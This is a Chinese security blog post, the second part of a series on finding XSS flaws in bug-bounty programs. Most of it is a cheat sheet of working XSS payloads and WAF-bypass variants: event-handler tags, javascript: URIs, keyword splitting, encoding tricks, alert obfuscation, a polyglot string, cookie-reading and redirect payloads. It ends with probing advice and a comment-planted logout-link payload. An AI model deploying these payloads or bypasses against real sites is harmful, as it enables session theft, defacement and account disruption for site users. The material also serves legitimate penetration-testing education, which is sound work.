#  (SRC漏洞挖掘二)XSS漏洞挖掘下   
 迪哥讲事   2023-08-31 22:27  
  
**免责声明**  
  
由于传播、利用本公众号红云谈安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号红云谈安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！本文为连载文章欢迎大家关注红云谈安全公众号！  
  
# 前言  
  
你碰到WAF是不是都绕不过去？  
  
你是不是只会使用别人的绕过语句？  
  
你是不是只要别人的绕过语句给拦了就束手无措了？  
# XSS漏洞常见标签  
  
这些标签不用刻意去记，当需要用到的时候直接翻笔记即可，经常用到的话大脑会形成肌肉记忆，不断的去用自然会在脑海慢慢留下记忆
无过滤情况  
  
<sciript>  
```
<script>alert(1);</sciript>

```  
  
<img>  
```
图片加载错误时触发
<img src="x" onerror=alert(1)>
<img src="1" onerror=eval("alert('xss')")>
鼠标指针移动到元素时触发
<img src=1 onmouseover="alert(1)">
鼠标指针移出时触发
<img src=1 onmouseout="alert(1")>

```  
  
<a>  
```
<a href="http://www.qq.com">qq</a>
<a href=javascript:alert('1')>test</a>
<a href=j"avascript:a" onmouseover="alert(/xss/)">aa</a>
<a href="" onclick=eval(alert('xss'))>aa</a>
<a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016>aa</a>

```  
  
<input>  
```
<input onfocus="alert('xss');">
竞争焦点，从而触发onblur事件
<input onblur=alert("xss") autofocus><input autofocus>
通过autofocus属性执行本身的focus事件，这个变量是使焦点自动跳转到输入元素上,触发焦点事件，无需用户去触发
<input onfocus="alert('xss');" autofocus>
<input value="" onclick=alert('xss') type="text">
<input name="name" value="" onmouseover=prompt('xss') bad="">
<input name="name" value=""><script>alert('xss')</script>
按下按键时触发
<input type="text" onkeydown="alert(1)">
按下按键时触发
<input type="text" onkeypress="alert(1)">
松开按键式时触发
<input type="text" onkeyup="alert(1)">

```  
  
<from>  
```
<form action=javascript:alert('xss') method="get">
<form action=javasript:laert('xss')>
<form action=1 onmouseover=alert('xss)>
```  
  
iframe  
```
<iframe onload=alert("xss");></iframe>
<iframe src=javascript:alert('xss')></iframe>
<iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
<iframe src="data:text/html;base64,<script>alert('xss')</script>">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
<iframe src="aaa" onmouseover=alert('xss') /><iframe>


```  
  
<svg>  
```
<svg onload=alert(1)>

```  
  
<body>  
```
<body onload="alert(1)">
利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发
<body onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>

```  
  
<button>  
```
元素上点击鼠标时触发
<button onclick="alert(1)">text</button>

```  
  
<p>  
```
元素上按下鼠标时触发
<p onmousedown="alert(1)">text</p>
元素上释放鼠标时触发
<p onmouseup="alert(1)">text</p>

```  
  
<details>  
```
<details ontoggle="alert('xss');">
使用open属性触发ontoggle事件，无需用户去触发
<details open ontoggle="alert('xss');">

```  
  
<select>  
```
<select onfocus=alert(1)></select>
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<select onfocus=alert(1) autofocus>

```  
  
<video>  
```
<video><source onerror="alert(1)">

```  
  
<audio>  
```
<audio src=x onerror=alert("xss");>

```  
  
<textarea>  
```
<textarea onfocus=alert("xss"); autofocus>

```  
  
<keygen>  
```
<keygen autofocus onfocus=alert(1)> //仅限火狐

```  
  
javascript伪协议  
```
<a>标签
<a href="javascript:alert('xss');">xss</a>
<iframe>标签
<iframe src=javascript:alert('xss');></iframe>
<img>标签
<img src=javascript:alert('xss')>//IE7以下
<form>标签
<form action="Javascript:alert(1)"><input type=submit>

```  
# WAF绕过思路  
## 过滤空格  
```
用 / 代替空格
<img/src="x"/onerror=alert("xss");>

```  
## 过滤关键字  
### 大小写绕过  
  
<ImG sRc=x onerRor=alert("xss");>  
### 双写关键字  
  
(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过，这要根据实战情况下进行改写)  
  
<imimgg srsrcc=x onerror=alert("xss");>  
### 1、字符拼接  
  
比如过滤的是alert(利用eval，不仅仅在img标签中其他标签照样适用可以不断进行改写)  
  
<img src="x" onerror="a=aler;b=t;c='(xss);';eval(a+b+c)">  
### 2、字符拼接  
  
(利用top，不仅仅在script标签中其他标签照样适用可以不断进行改写)  
```
<script>top["al"+"ert"](``xss``);</script>(只有两个``这里是为了凸显出有`符号)

```  
## 其它字符混淆  
```
有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
下面举几个简单的例子

可利用注释
`<<script>alert("xss");//<</script>
<scri<!--test-->pt>alert("hello world!")</scri<!--test-->pt>`
标签的优先级
`<title><img src=</title>><img src=x onerror="alert(``xss``);">` 
因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
`<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>`
```  
## 编码绕过  
```
Unicode编码绕过
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">
<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">

url编码绕过
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>

Ascii码绕过
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">

Hex绕过
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>

八进制绕过
<img src=x onerror=alert('\170\163\163')>

base64绕过
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">


```  
  
过滤括号  
```
当括号被过滤的时候可以使用throw来绕过
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">

```  
  
过滤url地址  
```
使用url编码
<img src="x" onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``>

使用IP
<img src="x" onerror=document.location=``http://2130706433/``>十进制

<img src="x" onerror=document.location=``http://0177.0.0.01/``>八进制

<img src="x" onerror=document.location=``http://0x7f.0x0.0x0.0x1/``>十六进制

<img src="x" onerror=document.location=``//www.baidu.com``>html标签中用//可以代替http://
使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)

使用中文逗号代替英文逗号
<img src="x" onerror="document.location=``http://www。baidu。com``">//会自动跳转到百度

```  
  
注意如果有的src直接插入的话，可以使用<img src="x" onerror=console.log(alert(document.cookie));>来测试  
```
限制 ” 符号，输入<img src=1 onclick=alert(‘1’)>
限制 ‘ 符号，输入<img src=1 onclick=alert(/1/)>、<img src=1 onclick=”alert(1)”>
限制 () 符号，输入<img src=1 onclick=”alert `’1’`”>
限制 () ‘ ” 符号，输入<img src=1 onclick=alert `1`>

```  
## alert绕过  
```
 (alert)(1)
a=alert,a(1)
[1].find(alert)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[‘al\145rt’](1)
top[8680439..toString(30)](1)

```  
  
一些绕过语句  
```
<sVG/x=">"/oNloaD=confirm()//
/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```  
  
<lol/onauxclick=[0].some(alert)>rightclick  
  
<svg onx=() onload=(confirm)(1)>  
  
<xssBypass/onpointermove=(confirm)(1)>MoveMouseHere  
  
<svg onx=() onload=(confirm)(1)>  
  
# 实战中的绕过思路  
  
在实战中每个服务器过滤拦截的参数不同，而真正掌握绕过并不是说利用别人的payload，因为别人的payload很可能在你挖掘漏洞的时候不管用！你要根据实战情况自己去编写绕过语句！不要一看到利用上面的绕过语句绕不过去就放弃了！可以明确告诉你，基本都需要自己来绕过，而且绝大多数xss漏洞都需要进行绕过。XSS绕过中**最重要**的就是XSS语句的**跟踪**，我们得跟踪我们输入的语句，然后根据服务器的拦截情况不断的去试。一定要多去跟踪，多去尝试！这样你绕过能力就会慢慢提升。![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFjB0O5qSNPbwC3jVbPYOoiciclMbmGjgEHQiaptbKBxILWax8q4BZdfeeVjlXz26BT8EUm705owuwRA/640?wx_fmt=png "")  
1、先输入标签看哪些标签会给栏，不要一开始输入整个上面的payload，看哪些标签不给拦，一般第一开始先输入<img>，找到了不会拦截的标签就好办，然后对照上面绕过的思路进行改写语句，如果不会给拦截的标签绕不过去的话就果断选择下一个。输入标签的时候如果整个标签会给拦，那就先输入一小部分，如<select>标签会给拦截，那就先输入<se、<sele、<select这样一步一步的进行输入来看到底是怎么给拦截方式，弄懂基本的拦截思路就会比较容易绕过。  
  
2、后面就继续添加，比如会拦截onerror事件，那就先输入one，看还不会给栏，一步一步添加到整个onerror，那就根据上面的绕过思路来实现绕法。  
  
3、有的确实是绕不过去，就不要绕了，我遇到很多绕不过去的，只有img标签可以，但是也可以交一交，就是img标签后的链接更改为退出账号的链接，这样只要对方访问你的评论查看你的内容就自动账号退出，危害还是可以的。  
  
如果你是一个长期主义者，欢迎加入我的知识星球([优先查看这个链接，里面可能还有优惠券](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247489122&idx=1&sn=a022eae85e06e46d769c60b2f608f2b8&chksm=e8a61c01dfd195170a090bce3e27dffdc123af1ca06d196aa1c7fe623a8957755f0cc67fe004&scene=21#wechat_redirect)  
)，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
## 往期回顾  
  
[2022年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[SSRF研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486912&idx=1&sn=8704ce12dedf32923c6af49f1b139470&chksm=e8a607a3dfd18eb5abc302a40da024dbd6ada779267e31c20a0fe7bbc75a5947f19ba43db9c7&scene=21#wechat_redirect)  
  
  
[xss研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487130&idx=1&sn=e20bb0ee083d058c74b5a806c8a581b3&chksm=e8a604f9dfd18defaeb9306b89226dd3a5b776ce4fc194a699a317b29a95efd2098f386d7adb&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
## 福利视频  
  
笔者自己录制的一套php视频教程(适合0基础的),感兴趣的童鞋可以看看,基础视频总共约200多集,目前已经录制完毕,后续还有更多视频出品  
  
https://space.bilibili.com/177546377/channel/seriesdetail?sid=2949374  
## 技术交流  
  
技术交流请加笔者微信:richardo1o1 (暗号:growing)  
  
  
  
